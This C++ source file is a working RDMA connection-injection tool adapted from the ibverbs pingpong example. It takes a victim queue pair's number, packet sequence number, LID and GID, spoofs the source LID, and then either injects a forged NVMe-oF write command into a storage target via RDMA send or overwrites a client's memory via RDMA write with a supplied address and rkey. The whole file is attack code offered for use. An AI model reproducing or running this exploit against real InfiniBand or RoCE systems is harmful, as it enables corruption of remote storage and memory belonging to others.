#include <infiniband/verbs.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>
#include <malloc.h>
#include <getopt.h>
#include <arpa/inet.h>
#include <time.h>
#include <thread>



// todo parse
static const unsigned char nvme_header[] = {
0x01, 0x40, /* .......@ */
0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* ........ */
0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

struct pingpong_context {
	struct ibv_context	*context;
	struct ibv_comp_channel *channel;
	struct ibv_pd		*pd;
	struct ibv_mr		*mr;
	struct ibv_cq		*cq;
	struct ibv_qp		*qp;
	void			*buf;
	struct ibv_port_attr     portinfo;
};


struct pingpong_dest {
	uint32_t lid;
	uint32_t qpn;
	uint32_t psn;
	union ibv_gid gid;
};


static int pp_connect_ctx(struct pingpong_context *ctx, uint32_t port,  struct pingpong_dest *src,
			  enum ibv_mtu mtu,  struct pingpong_dest *dest, uint8_t sgid_idx)
{
	struct ibv_qp_attr attr = {};
	attr.qp_state		= IBV_QPS_RTR;
	attr.path_mtu		= mtu;
	attr.dest_qp_num		= dest->qpn;

	attr.rq_psn			= src->psn; // receive psn
	attr.max_dest_rd_atomic	= 1;
	attr.min_rnr_timer		= 12;
	attr.ah_attr.is_global	= 0;
	attr.ah_attr.dlid		= dest->lid;
	attr.ah_attr.sl		= 0;
	attr.ah_attr.src_path_bits	= 0;
	attr.ah_attr.port_num	= port;
		
	if (dest->gid.global.interface_id) {
		attr.ah_attr.is_global = 1;
		attr.ah_attr.grh.hop_limit = 1;
		attr.ah_attr.grh.dgid = dest->gid;
		attr.ah_attr.grh.sgid_index = sgid_idx;
	}

	if (ibv_modify_qp(ctx->qp, &attr,
			  IBV_QP_STATE              |
			  IBV_QP_AV                 |
			  IBV_QP_PATH_MTU           |
			  IBV_QP_DEST_QPN           |
			  IBV_QP_RQ_PSN             |
			  IBV_QP_MAX_DEST_RD_ATOMIC |
			  IBV_QP_MIN_RNR_TIMER)) {
		fprintf(stderr, "Failed to modify QP to RTR\n");
		return 1;
	}

	attr.qp_state	    = IBV_QPS_RTS;
	attr.timeout	    = 14;
	attr.retry_cnt	    = 0;
	attr.rnr_retry	    = 0;
	attr.sq_psn	    = dest->psn;
	attr.max_rd_atomic  = 1;
	if (ibv_modify_qp(ctx->qp, &attr,
			  IBV_QP_STATE              |
			  IBV_QP_TIMEOUT            |
			  IBV_QP_RETRY_CNT          |
			  IBV_QP_RNR_RETRY          |
			  IBV_QP_SQ_PSN             |
			  IBV_QP_MAX_QP_RD_ATOMIC)) {
		fprintf(stderr, "Failed to modify QP to RTS\n");
		return 1;
	}

	return 0;
}

 

static struct pingpong_context *pp_init_ctx(struct ibv_device *ib_dev, uint8_t port)
{
	struct pingpong_context *ctx;

	ctx = (pingpong_context*)calloc(1, sizeof *ctx);
	if (!ctx)
		return NULL;
 

	ctx->buf = memalign(4096, 4096);
	if (!ctx->buf) {
		fprintf(stderr, "Couldn't allocate work buf.\n");
		goto clean_ctx;
	}

	ctx->context = ibv_open_device(ib_dev);
	if (!ctx->context) {
		fprintf(stderr, "Couldn't get context for %s\n",
			ibv_get_device_name(ib_dev));
		goto clean_buffer;
	}



	ctx->pd = ibv_alloc_pd(ctx->context);
	if (!ctx->pd) {
		fprintf(stderr, "Couldn't allocate PD\n");
		goto clean_device;
	}


	ctx->mr = ibv_reg_mr(ctx->pd, ctx->buf, 4096, IBV_ACCESS_LOCAL_WRITE);

	if (!ctx->mr) {
		fprintf(stderr, "Couldn't register MR\n");
		goto clean_pd;
	}


	ctx->cq = ibv_create_cq(ctx->context, 100 + 1, NULL,
					     NULL, 0);
	
	{
		struct ibv_qp_init_attr init_attr = {};
		init_attr.send_cq = ctx->cq;
		init_attr.recv_cq = ctx->cq;
		init_attr.cap.max_send_wr  = 1;
		init_attr.cap.max_recv_wr  = 16;
		init_attr.cap.max_send_sge = 1;
		init_attr.cap.max_recv_sge = 1;
		init_attr.qp_type = IBV_QPT_RC;

		ctx->qp = ibv_create_qp(ctx->pd, &init_attr);
		if (!ctx->qp)  {
			fprintf(stderr, "Couldn't create QP\n");
			goto clean_cq;
		}
	}

	{
		struct ibv_qp_attr attr = {};
		attr.qp_state        = IBV_QPS_INIT;
		attr.pkey_index      = 0;
		attr.port_num        = port;
		attr.qp_access_flags = 0;

		if (ibv_modify_qp(ctx->qp, &attr,
				  IBV_QP_STATE              |
				  IBV_QP_PKEY_INDEX         |
				  IBV_QP_PORT               |
				  IBV_QP_ACCESS_FLAGS)) {
			fprintf(stderr, "Failed to modify QP to INIT\n");
			goto clean_qp;
		}
	}

	return ctx;

clean_qp:
	ibv_destroy_qp(ctx->qp);

clean_cq:
	ibv_destroy_cq(ctx->cq);

clean_mr:
	ibv_dereg_mr(ctx->mr);

clean_pd:
	ibv_dealloc_pd(ctx->pd);

clean_device:
	ibv_close_device(ctx->context);

clean_buffer:
	free(ctx->buf);

clean_ctx:
	free(ctx);

	return NULL;
}

int pp_close_ctx(struct pingpong_context *ctx)
{
	if (ibv_destroy_qp(ctx->qp)) {
		fprintf(stderr, "Couldn't destroy QP\n");
		return 1;
	}

	if (ibv_destroy_cq(ctx->cq)) {
		fprintf(stderr, "Couldn't destroy CQ\n");
		return 1;
	}

	if (ibv_dereg_mr(ctx->mr)) {
		fprintf(stderr, "Couldn't deregister MR\n");
		return 1;
	}

	if (ibv_dealloc_pd(ctx->pd)) {
		fprintf(stderr, "Couldn't deallocate PD\n");
		return 1;
	}

	if (ibv_close_device(ctx->context)) {
		fprintf(stderr, "Couldn't release context\n");
		return 1;
	}

	free(ctx->buf);
	free(ctx);

	return 0;
}

 
static int pp_post_send(struct pingpong_context *ctx)
{	
	memcpy(ctx->buf,nvme_header,sizeof(nvme_header));
	*(uint64_t*)((char*)ctx->buf + sizeof(nvme_header))= 0xffffffff;
	
	struct ibv_sge list = {};
	list.addr	= (uintptr_t) ctx->buf;
	list.length = sizeof(nvme_header) + 512;
	list.lkey	= ctx->mr->lkey;

	struct ibv_send_wr wr = {};
	wr.wr_id	    = 1;
	wr.sg_list    = &list;
	wr.num_sge    = 1;
	wr.opcode     = IBV_WR_SEND;
	wr.send_flags = IBV_SEND_SIGNALED;

	struct ibv_send_wr *bad_wr;

	return ibv_post_send(ctx->qp, &wr, &bad_wr);
}

static int pp_post_write(struct pingpong_context *ctx,uint64_t addr, uint32_t rkey)
{	

	*(uint64_t*)ctx->buf = 0xffffffff;
	
	struct ibv_sge list = {};
	list.addr	= (uintptr_t) ctx->buf;
	list.length = 8;
	list.lkey	= ctx->mr->lkey;

	struct ibv_send_wr wr = {};
	wr.wr_id	    = 1;
	wr.sg_list    = &list;
	wr.num_sge    = 1;
	wr.opcode     = IBV_WR_RDMA_WRITE;
	wr.wr.rdma.remote_addr = addr;
	wr.wr.rdma.rkey        = rkey;
	//wr.send_flags = IBV_SEND_SIGNALED;

	struct ibv_send_wr *bad_wr;

	return ibv_post_send(ctx->qp, &wr, &bad_wr);
}

void print_data(struct pingpong_context *ctx){

  struct ibv_qp_attr attr;
  struct ibv_qp_init_attr init_attr;
  int ret = ibv_query_qp(ctx->qp, &attr, IBV_QP_STATE| IBV_QP_RQ_PSN | IBV_QP_SQ_PSN | IBV_QP_DEST_QPN, &init_attr );
  if(ret == 0){
   if(attr.qp_state != 3){
     printf("Connection has been broken\n");
     return;
   }
   printf("Dest QPNUM %u recv_psn %u send_psn %u \n", attr.dest_qp_num, attr.rq_psn, attr.sq_psn);
  }
}



static void usage(const char *argv0)
{
	printf("Usage:\n");
	printf("  %s            start a server and wait for connection\n", argv0);
	printf("  %s <host>     connect to server at <host>\n", argv0);
	printf("\n");
	printf("Options:\n");
	printf("  -d, --ib-dev=<dev>     use IB device <dev> (default first device found)\n");
	printf("  -i, --ib-port=<port>   use port <port> of IB device (default 1)\n");
	printf("  -g, --gid-idx=<gid index> local port gid index\n");

}

int main(int argc, char *argv[])
{
	struct ibv_device      **dev_list;
	struct ibv_device	*ib_dev;
	struct pingpong_context *ctx;
	struct pingpong_dest     my_dest;
	struct pingpong_dest     rem_dest;
	char                    *ib_devname = NULL;
	char                    *servername = NULL;
	uint8_t                  ib_port = 1;
	unsigned int             size = 64;
	enum ibv_mtu		  mtu = IBV_MTU_1024;
	uint32_t 		  slid = 0;
	uint32_t 		  dlid = 0;
	uint32_t 		  qpn = 0;
	uint32_t 		  psn = 0;

	uint8_t sgid_idx = 0;
	union ibv_gid dgid = {};
	char			 gid[33];

	uint32_t rkey = 0;
	uint64_t addr = 0;
	while (1) {
		int c;

		static struct option long_options[] = {
			{ "addr",    required_argument, 0 , 'a' },
			{ "rkey",   required_argument, 0 ,  'r' },
			{ "ib-dev",   required_argument, 0 ,  'd' },
			{ "ib-port",  required_argument, 0 , 'i' },
			{ "qpn",  required_argument, 0 ,  'q' },
			{ "psn",  required_argument, 0 , 'n' },
			{ "slid", required_argument, 0 ,  's' },
			{ "dlid",   required_argument, 0 ,  't' },
			{ "sgid",   required_argument, 0 , 'g' },
			{ "dgid1",  required_argument, 0 ,  'x' },
			{ "dgid2",   required_argument, 0 ,  'z' },
			{0, 0, 0, 0}
		};

		c = getopt_long(argc, argv, "a:r:d:i:q:n:s:t:g:x:z:",
				long_options, NULL);

		if (c == -1)
			break;

		switch (c) {
		case 'a':
			addr = strtoull(optarg, NULL, 0);
			break;
		case 'r':
			rkey = strtoul(optarg, NULL, 0);
			break;

		case 'd':
			ib_devname = strdupa(optarg);
			break;

		case 'i':
			ib_port = (uint8_t)strtol(optarg, NULL, 0);
			if (ib_port < 1) {
				usage(argv[0]);
				return 1;
			}
			break;

		case 'q':
			qpn = strtol(optarg, NULL, 0);
			break;
		case 'n':
			psn = strtol(optarg, NULL, 0);
			break;
		case 's':
			slid = strtol(optarg, NULL, 0);
			break;
		case 't':
			dlid = strtol(optarg, NULL, 0);
			break;

		case 'g':
			sgid_idx = strtol(optarg, NULL, 0);
			break;

		case 'x':
			dgid.global.subnet_prefix = strtoull(optarg, NULL, 0);
			break;
		case 'z':
			dgid.global.interface_id = strtoull(optarg, NULL, 0);
			break;

		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (optind == argc - 1)
		servername = strdupa(argv[optind]);
	else if (optind < argc) {
		usage(argv[0]);
		return 1;
	}

	dev_list = ibv_get_device_list(NULL);
	if (!dev_list) {
		perror("Failed to get IB devices list");
		return 1;
	}

	if (!ib_devname) {
		ib_dev = *dev_list;
		if (!ib_dev) {
			fprintf(stderr, "No IB devices found\n");
			return 1;
		}
	} else {
		int i;
		for (i = 0; dev_list[i]; ++i)
			if (!strcmp(ibv_get_device_name(dev_list[i]), ib_devname))
				break;
		ib_dev = dev_list[i];
		if (!ib_dev) {
			fprintf(stderr, "IB device %s not found\n", ib_devname);
			return 1;
		}
	}

	ctx = pp_init_ctx(ib_dev, ib_port);
	if (!ctx)
		return 1;
 

	if (ibv_query_port(ctx->context, ib_port, &ctx->portinfo)) {
		fprintf(stderr, "Couldn't get port info\n");
		return 1;
	}
	
	printf("My current slid is %u \n",ctx->portinfo.lid);
	if(slid != ctx->portinfo.lid) printf("We need to hack IB to set slid to %u \n",slid );

 	my_dest.lid = slid;
	my_dest.qpn = ctx->qp->qp_num;
	my_dest.psn = 0; // my receive psn

 
        rem_dest.lid = dlid;
	rem_dest.qpn = qpn;
	rem_dest.psn = psn; // my send psn
	rem_dest.gid = dgid; // my send psn

 	printf("Remote Gid1: 0x%llx\nGid2: 0x%llx\n",rem_dest.gid.global.subnet_prefix, rem_dest.gid.global.interface_id);
	inet_ntop(AF_INET6, &rem_dest.gid, gid, sizeof gid);
	printf("  remote address:  LID 0x%04x, QPN 0x%06x, PSN 0x%06x, GID %s\n",
	       rem_dest.lid, rem_dest.qpn, rem_dest.psn,gid);


	if (pp_connect_ctx(ctx, ib_port, &my_dest, mtu,  &rem_dest, sgid_idx))
	   return 1;
  
	 
	printf("Connected\n");
	print_data(ctx);
	if(addr == 0){
		printf("Inject to target a NVMe-oF write via an RDMA send\n");
		pp_post_send(ctx);
	} else {
		printf("Inject to client data via an RDMA write to client\n");
		pp_post_write(ctx,addr,rkey);
	}
	
	//
	print_data(ctx);
        exit(1); 	
	std::this_thread::sleep_for(std::chrono::seconds(5000));


	if (pp_close_ctx(ctx))
		return 1;

	ibv_free_device_list(dev_list);

	return 0;
}

